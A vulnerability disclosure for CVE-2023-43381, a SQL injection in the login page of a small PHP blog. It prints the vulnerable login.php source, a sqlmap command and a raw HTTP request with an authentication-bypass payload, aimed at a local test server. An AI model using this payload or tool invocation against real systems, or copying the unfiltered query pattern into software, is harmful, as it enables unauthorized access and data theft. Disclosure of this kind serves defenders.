# CVE-2023-43381

## powered by Chiaki2333 ##

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43381

## Vulnerability link ##

https://github.com/tianchoy/blog

## Vulnerability details ##
login.php Line 9

	<?php
	@session_start();
	require_once 'db.php';  //引入相关文件

	function secret($num){
		$num = md5($num);
		return $num;
	}

	@$user= $_POST['user'];
	@$password= secret($_POST['password']);
	$query = "select * from register where user='$user' and password='$password'"; //对比输入的数据和数据库里的数据
	$res=mysql_query($query);
	@$row=mysql_fetch_array($res);
	if(isset($_POST['submit'])){
		if($_POST['user']=$row['user'] and $_POST['password']=$row['password']){
			$_SESSION['user']=$user;
			$_SESSION['id']=@$result['id'];
			echo $user,'欢迎你！进入<a href="admin.php">个人中心</a><br/>';
			echo '点击此处<a href="login.php?action=logout">注销</a>';
			exit;
		}else{
			echo "<script>alert('登陆失败！')</script>",mysql_error();
			echo "点击<a href='javascript:history.back(-1);'>返回上一步</a>重试";
		}
		die;
	}
	?>



`$user` has not been filtered to cause injection

exploit

	sqlmap -u "http://127.0.0.1:81/login.php" --data="user=admin&password=admin&submit=" -p user --dbms=mysql --batch
    

Request

	POST /login.php HTTP/1.1
	Host: 127.0.0.1:81
	Content-Length: 49
	Cache-Control: max-age=0
	sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
	sec-ch-ua-mobile: ?0
	sec-ch-ua-platform: "Windows"
	Upgrade-Insecure-Requests: 1
	Origin: http://127.0.0.1:81
	Content-Type: application/x-www-form-urlencoded
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: navigate
	Sec-Fetch-User: ?1
	Sec-Fetch-Dest: document
	Referer: http://127.0.0.1:81/login.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.9
	Cookie: PHPSESSID=264fdll0jbmhgk9kheh3o9kbb2
	Connection: close
	
	user=admin'or'1'%3d'1'%20#&password=admin&submit=
    
Response

![Picture of sqlmap](https://github.com/Chiaki2333/vulnerability/blob/main/img/tianchoy-blog-sql-login.php-1.png)
![Picture of browser](https://github.com/Chiaki2333/vulnerability/blob/main/img/tianchoy-blog-sql-login.php-2.png)
![Picture of BurpSuite](https://github.com/Chiaki2333/vulnerability/blob/main/img/tianchoy-blog-sql-login.php-3.png)
